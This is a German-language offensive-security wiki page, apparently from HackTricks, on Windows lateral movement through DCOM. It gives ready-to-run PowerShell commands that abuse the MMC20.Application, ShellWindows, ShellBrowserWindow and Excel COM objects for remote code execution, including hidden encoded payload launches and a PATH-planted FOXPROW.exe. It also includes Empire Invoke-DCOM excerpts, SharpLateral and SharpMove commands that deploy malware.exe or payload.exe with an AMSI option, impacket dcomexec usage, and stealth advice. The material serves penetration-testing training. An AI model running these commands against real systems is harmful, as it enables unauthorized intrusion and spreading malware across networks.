# DCOM Exec

{{#include ../../banners/hacktricks-training.md}}

DCOM lateral movement ist attraktiv, weil es vorhandene COM-Server wiederverwendet, die über RPC/DCOM exponiert sind, statt einen Service oder Scheduled Task zu erstellen. In der Praxis bedeutet das, dass die anfängliche Verbindung normalerweise auf TCP/135 startet und dann zu dynamisch zugewiesenen hohen RPC-Ports wechselt.

## Prerequisites & Gotchas

- Du brauchst in der Regel einen lokalen Administrator-Kontext auf dem Ziel, und der entfernte COM-Server muss Remote Launch/Activation erlauben.
- Seit **March 14, 2023** erzwingt Microsoft DCOM hardening für unterstützte Systeme. Alte Clients, die ein niedriges Activation-Authentication-Level anfordern, können fehlschlagen, außer sie verhandeln mindestens `RPC_C_AUTHN_LEVEL_PKT_INTEGRITY`. Moderne Windows-Clients werden normalerweise automatisch höher gestuft, daher funktioniert aktuelles tooling meist weiter.
- Manuelle oder geskriptete DCOM execution benötigt in der Regel TCP/135 plus den dynamischen RPC-Portbereich des Ziels. Wenn du Impacket's `dcomexec.py` verwendest und Command Output zurückhaben willst, brauchst du normalerweise auch SMB-Zugriff auf `ADMIN$` (oder eine andere schreib-/lesbare Share).
- Wenn RPC/DCOM funktioniert, aber SMB blockiert ist, kann `dcomexec.py -nooutput` trotzdem nützlich für blind execution sein.

Quick checks:
```bash
# Enumerate registered DCOM applications
Get-CimInstance Win32_DCOMApplication | Select-Object AppID, Name

# Useful to inspect firewall/RPC issues
Test-NetConnection -ComputerName 10.10.10.10 -Port 135
```
## MMC20.Application

**Für weitere Informationen zu dieser Technik sieh den ursprünglichen Beitrag unter [https://enigma0x3.net/2017/01/05/lateral-movement-using-the-mmc20-application-com-object/](https://enigma0x3.net/2017/01/05/lateral-movement-using-the-mmc20-application-com-object/)**

Distributed Component Object Model (DCOM)-Objekte bieten eine interessante Möglichkeit für netzwerkbasierte Interaktionen mit Objekten. Microsoft stellt umfassende Dokumentation sowohl für DCOM als auch für Component Object Model (COM) bereit, abrufbar [hier für DCOM](https://msdn.microsoft.com/en-us/library/cc226801.aspx) und [hier für COM](<https://msdn.microsoft.com/en-us/library/windows/desktop/ms694363(v=vs.85).aspx>). Eine Liste von DCOM-Anwendungen kann mit dem PowerShell-Befehl abgerufen werden:
```bash
Get-CimInstance Win32_DCOMApplication
```
Das COM-Objekt, [MMC Application Class (MMC20.Application)](https://technet.microsoft.com/en-us/library/cc181199.aspx), ermöglicht das Scripting von MMC-Snap-in-Operationen. Insbesondere enthält dieses Objekt eine `ExecuteShellCommand`-Methode unter `Document.ActiveView`. Weitere Informationen zu dieser Methode findest du [hier](<https://msdn.microsoft.com/en-us/library/aa815396(v=vs.85).aspx>). Schau es in Aktion an:

Dieses Feature ermöglicht die Ausführung von Befehlen über ein Netzwerk mittels einer DCOM-Anwendung. Um remote als Admin mit DCOM zu interagieren, kann PowerShell wie folgt verwendet werden:
```bash
[activator]::CreateInstance([type]::GetTypeFromProgID("<DCOM_ProgID>", "<IP_Address>"))
```
Dieser Befehl verbindet sich mit der DCOM-Anwendung und gibt eine Instanz des COM-Objekts zurück. Die Methode ExecuteShellCommand kann dann aufgerufen werden, um einen Prozess auf dem Remote-Host auszuführen. Der Prozess umfasst die folgenden Schritte:

Check methods:
```bash
$com = [activator]::CreateInstance([type]::GetTypeFromProgID("MMC20.Application", "10.10.10.10"))
$com.Document.ActiveView | Get-Member
```
RCE erlangen:
```bash
$com = [activator]::CreateInstance([type]::GetTypeFromProgID("MMC20.Application", "10.10.10.10"))
$com.Document.ActiveView.ExecuteShellCommand(
"cmd.exe",
$null,
"/c powershell -NoP -W Hidden -Enc <B64>",
"7"
)
```
Das letzte Argument ist der window style. `7` hält das Fenster minimiert. Operativ führt MMC-basierte Ausführung typischerweise dazu, dass ein remote `mmc.exe`-Prozess deine payload startet, was sich von den Explorer-backed objects unten unterscheidet.

## ShellWindows & ShellBrowserWindow

**Für mehr Infos zu dieser technique schau dir den Original-Post an [https://enigma0x3.net/2017/01/23/lateral-movement-via-dcom-round-2/](https://enigma0x3.net/2017/01/23/lateral-movement-via-dcom-round-2/)**

Das **MMC20.Application**-Objekt wurde als ohne explizite "LaunchPermissions" identifiziert und fällt standardmäßig auf Permissions zurück, die Administrators Zugriff erlauben. Für weitere Details kann ein Thread [hier](https://twitter.com/tiraniddo/status/817532039771525120) angesehen werden, und die Verwendung von [@tiraniddo](https://twitter.com/tiraniddo)’s OleView .NET zum Filtern von Objects ohne explizite Launch Permission wird empfohlen.

Zwei bestimmte Objects, `ShellBrowserWindow` und `ShellWindows`, wurden hervorgehoben, da ihnen explizite Launch Permissions fehlen. Das Fehlen eines `LaunchPermission`-Registry-Eintrags unter `HKCR:\AppID\{guid}` bedeutet, dass keine expliziten Permissions vorhanden sind.

Im Vergleich zu `MMC20.Application` sind diese Objects aus OPSEC-Sicht oft leiser, weil der Befehl auf dem Remote-Host häufig als Child von `explorer.exe` statt von `mmc.exe` endet.

### ShellWindows

Für `ShellWindows`, das kein ProgID hat, erleichtern die .NET-Methoden `Type.GetTypeFromCLSID` und `Activator.CreateInstance` die Instanziierung des Objekts mithilfe seiner AppID. Dieser Prozess nutzt OleView .NET, um die CLSID für `ShellWindows` abzurufen. Nach der Instanziierung ist die Interaktion über die `WindowsShell.Item`-Methode möglich, was zu Methodenaufrufen wie `Document.Application.ShellExecute` führt.

Es wurden Beispiel-PowerShell-Befehle bereitgestellt, um das Objekt zu instanziieren und Befehle remote auszuführen:
```bash
# Example
$com = [Type]::GetTypeFromCLSID("<clsid>", "<IP>")
$obj = [System.Activator]::CreateInstance($com)
$item = $obj.Item()
$item.Document.Application.ShellExecute("cmd.exe", "/c calc.exe", "c:\windows\system32", $null, 0)
```
### ShellBrowserWindow

`ShellBrowserWindow` ist ähnlich, aber du kannst es direkt über seine CLSID instanziieren und zu `Document.Application.ShellExecute` pivotieren:
```bash
$com = [Type]::GetTypeFromCLSID("C08AFD90-F2A1-11D1-8455-00A0C91F3880", "10.10.10.10")
$obj = [System.Activator]::CreateInstance($com)
$obj.Document.Application.ShellExecute(
"cmd.exe",
"/c whoami > C:\\Windows\\Temp\\dcom.txt",
"C:\\Windows\\System32",
$null,
0
)
```
### Laterale Bewegung mit Excel DCOM Objects

Laterale Bewegung kann durch das Ausnutzen von DCOM Excel objects erreicht werden. Für detaillierte Informationen empfiehlt es sich, die Diskussion über die Nutzung von Excel DDE für laterale Bewegung via DCOM im [Cybereason's blog](https://www.cybereason.com/blog/leveraging-excel-dde-for-lateral-movement-via-dcom) zu lesen.

Das Empire project stellt ein PowerShell script bereit, das die Nutzung von Excel für remote code execution (RCE) durch Manipulation von DCOM objects demonstriert. Unten sind Auszüge aus dem Script, das im [Empire's GitHub repository](https://github.com/EmpireProject/Empire/blob/master/data/module_source/lateral_movement/Invoke-DCOM.ps1) verfügbar ist, und verschiedene Methoden zeigt, wie Excel für RCE missbraucht werden kann:
```bash
# Detection of Office version
elseif ($Method -Match "DetectOffice") {
$Com = [Type]::GetTypeFromProgID("Excel.Application","$ComputerName")
$Obj = [System.Activator]::CreateInstance($Com)
$isx64 = [boolean]$obj.Application.ProductCode[21]
Write-Host  $(If ($isx64) {"Office x64 detected"} Else {"Office x86 detected"})
}
# Registration of an XLL
elseif ($Method -Match "RegisterXLL") {
$Com = [Type]::GetTypeFromProgID("Excel.Application","$ComputerName")
$Obj = [System.Activator]::CreateInstance($Com)
$obj.Application.RegisterXLL("$DllPath")
}
# Execution of a command via Excel DDE
elseif ($Method -Match "ExcelDDE") {
$Com = [Type]::GetTypeFromProgID("Excel.Application","$ComputerName")
$Obj = [System.Activator]::CreateInstance($Com)
$Obj.DisplayAlerts = $false
$Obj.DDEInitiate("cmd", "/c $Command")
}
```
Aktuelle Forschung hat diesen Bereich mit der `ActivateMicrosoftApp()`-Methode von `Excel.Application` erweitert. Die zentrale Idee ist, dass Excel versuchen kann, ältere Microsoft-Anwendungen wie FoxPro, Schedule Plus oder Project zu starten, indem es den systemweiten `PATH` durchsucht. Wenn ein Operator eine Payload mit einem dieser erwarteten Namen in einem beschreibbaren Verzeichnis platzieren kann, das Teil des `PATH` des Ziels ist, wird Excel sie ausführen.

Voraussetzungen für diese Variante:

- Lokaler Admin auf dem Ziel
- Excel auf dem Ziel installiert
- Möglichkeit, eine Payload in ein beschreibbares Verzeichnis im `PATH` des Ziels zu schreiben

Praktisches Beispiel für das Ausnutzen der FoxPro-Suche (`FOXPROW.exe`):
```bash
copy C:\Windows\System32\calc.exe \\192.168.52.100\c$\Users\victim\AppData\Local\Microsoft\WindowsApps\FOXPROW.exe
$com = [System.Activator]::CreateInstance([type]::GetTypeFromProgID("Excel.Application", "192.168.52.100"))
$com.ActivateMicrosoftApp("5")
```
Wenn der angreifende Host den lokalen `Excel.Application` ProgID nicht registriert hat, instanziere das Remote-Objekt stattdessen über die CLSID:
```bash
$com = [System.Activator]::CreateInstance([type]::GetTypeFromCLSID("00020812-0000-0000-C000-000000000046", "192.168.52.100"))
$com.Application.ActivateMicrosoftApp("5")
```
In der Praxis missbrauchte Werte:

- `5` -> `FOXPROW.exe`
- `6` -> `WINPROJ.exe`
- `7` -> `SCHDPLUS.exe`

### Automation Tools for Lateral Movement

Zwei Tools werden hervorgehoben, um diese Techniken zu automatisieren:

- **Invoke-DCOM.ps1**: Ein PowerShell-Skript aus dem Empire-Projekt, das die Ausführung verschiedener Methoden zum Code-Execution auf Remote-Maschinen vereinfacht. Dieses Skript ist im Empire GitHub-Repository verfügbar.

- **SharpLateral**: Ein Tool zum Remote-Execution von Code, das mit dem folgenden Befehl verwendet werden kann:
```bash
SharpLateral.exe reddcom HOSTNAME C:\Users\Administrator\Desktop\malware.exe
```
- [SharpMove](https://github.com/0xthirteen/SharpMove):
```bash
SharpMove.exe action=dcom computername=remote.host.local command="C:\windows\temp\payload.exe\" method=ShellBrowserWindow amsi=true
```
## Automatisierte Tools

- Das Powershell-Skript [**Invoke-DCOM.ps1**](https://github.com/EmpireProject/Empire/blob/master/data/module_source/lateral_movement/Invoke-DCOM.ps1) ermöglicht es, alle kommentierten Wege zur Ausführung von Code auf anderen Maschinen einfach auszuführen.
- Du kannst Impackets `dcomexec.py` verwenden, um Befehle auf entfernten Systemen über DCOM auszuführen. Aktuelle Builds unterstützen `ShellWindows`, `ShellBrowserWindow` und `MMC20` und verwenden standardmäßig `ShellWindows`.
```bash
dcomexec.py 'DOMAIN'/'USER':'PASSWORD'@'target_ip' "cmd.exe /c whoami"

# Pick the object explicitly
dcomexec.py -object MMC20 'DOMAIN'/'USER':'PASSWORD'@'target_ip' "cmd.exe /c whoami"

# Blind execution when SMB/output retrieval is not available
dcomexec.py -object ShellBrowserWindow -nooutput 'DOMAIN'/'USER':'PASSWORD'@'target_ip' "cmd.exe /c calc.exe"
```
- Du könntest auch [**SharpLateral**](https://github.com/mertdas/SharpLateral) verwenden:
```bash
SharpLateral.exe reddcom HOSTNAME C:\Users\Administrator\Desktop\malware.exe
```
- Du könntest auch [**SharpMove**](https://github.com/0xthirteen/SharpMove)
```bash
SharpMove.exe action=dcom computername=remote.host.local command="C:\windows\temp\payload.exe\" method=ShellBrowserWindow amsi=true
```
## References

- [https://enigma0x3.net/2017/01/05/lateral-movement-using-the-mmc20-application-com-object/](https://enigma0x3.net/2017/01/05/lateral-movement-using-the-mmc20-application-com-object/)
- [https://enigma0x3.net/2017/01/23/lateral-movement-via-dcom-round-2/](https://enigma0x3.net/2017/01/23/lateral-movement-via-dcom-round-2/)
- [https://support.microsoft.com/en-us/topic/kb5004442-manage-changes-for-windows-dcom-server-security-feature-bypass-cve-2021-26414-f1400b52-c141-43d2-941e-37ed901c769c](https://support.microsoft.com/en-us/topic/kb5004442-manage-changes-for-windows-dcom-server-security-feature-bypass-cve-2021-26414-f1400b52-c141-43d2-941e-37ed901c769c)
- [https://specterops.io/blog/2023/10/30/lateral-movement-abuse-the-power-of-dcom-excel-application/](https://specterops.io/blog/2023/10/30/lateral-movement-abuse-the-power-of-dcom-excel-application/)

{{#include ../../banners/hacktricks-training.md}}
